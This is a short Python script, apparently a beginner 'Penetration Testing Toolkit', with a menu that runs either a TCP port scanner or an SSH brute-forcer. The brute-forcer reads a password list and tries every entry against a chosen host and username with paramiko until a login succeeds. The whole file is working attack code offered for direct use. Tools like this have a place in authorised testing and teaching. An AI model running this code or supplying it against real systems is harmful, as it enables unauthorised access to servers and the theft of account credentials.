import socket
import paramiko

# ===============================
# Port Scanner Module
# ===============================
def port_scanner(target, ports):
    print(f"\n[+] Scanning Target: {target}")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[OPEN] Port {port}")
            sock.close()
        except KeyboardInterrupt:
            print("\n[-] Scan interrupted by user.")
            break
        except Exception as e:
            print(f"[ERROR] Scanning port {port}: {e}")

# ===============================
# SSH Brute Forcer Module
# ===============================
def ssh_brute_force(target, username, password_list):
    print(f"\n[+] Starting SSH Brute Force on {target} with user '{username}'")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            print(f"[SUCCESS] Password found: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[FAILED] {password}")
        except Exception as e:
            print(f"[ERROR] {e}")
    print("[-] Brute force completed. No valid password found.")

# ===============================
# Main Menu
# ===============================
def main():
    print("=== Penetration Testing Toolkit ===")
    print("1. Port Scanner")
    print("2. SSH Brute Forcer")
    
    choice = input("Select a module (1-2): ")

    if choice == "1":
        target = input("Enter target IP address: ")
        ports_input = input("Enter comma-separated ports (default 21,22,80,443): ")
        ports = [int(p.strip()) for p in ports_input.split(",")] if ports_input else [21, 22, 80, 443]
        port_scanner(target, ports)

    elif choice == "2":
        target = input("Enter target IP address: ")
        username = input("Enter SSH username: ")
        password_file = input("Enter path to password list file: ")

        try:
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            print(f"[-] Password file '{password_file}' not found.")
            return

        ssh_brute_force(target, username, passwords)

    else:
        print("[-] Invalid choice. Exiting.")

# ===============================
# Program Entry Point
# ===============================
if __name__ == "__main__":
    main()
